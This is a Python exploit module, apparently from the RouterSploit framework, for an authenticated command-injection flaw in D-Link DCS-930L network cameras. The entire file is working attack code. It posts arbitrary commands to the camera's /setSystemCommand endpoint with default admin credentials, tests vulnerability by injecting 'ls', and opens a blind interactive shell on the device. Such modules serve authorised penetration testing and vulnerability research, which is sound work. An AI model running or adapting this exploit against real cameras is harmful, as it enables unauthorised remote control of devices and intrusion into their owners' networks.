from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DCS-930L Auth RCE",
        "description": "Module exploits D-Link DCS-930L Remote Code Execution vulnerability which allows executing command on the device.",
        "authors": (
            "Nicholas Starke <nick[at]alephvoid.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/39437/",
        ),
        "devices": (
            "D-Link DCS-930L",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("admin", "Username to log in with")
    password = OptString("", "Password to log in with")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {
            "ReplySuccessPage": "docmd.htm",
            "ReplyErrorPage": "docmd.htm",
            "SystemCommand": cmd,
            "ConfigSystemCommand": "Save"
        }

        self.http_request(
            method="POST",
            path="/setSystemCommand",
            headers=headers,
            data=data,
            auth=(self.username, self.password)
        )

        return ""

    @mute
    def check(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {
            "ReplySuccessPage": "docmd.htm",
            "ReplyErrorPage": "docmd.htm",
            "SystemCommand": "ls",
            "ConfigSystemCommand": "Save"
        }

        response = self.http_request(
            method="POST",
            path="/setSystemCommand",
            headers=headers,
            data=data,
            auth=(self.username, self.password),
        )

        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "ConfigSystemCommand" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
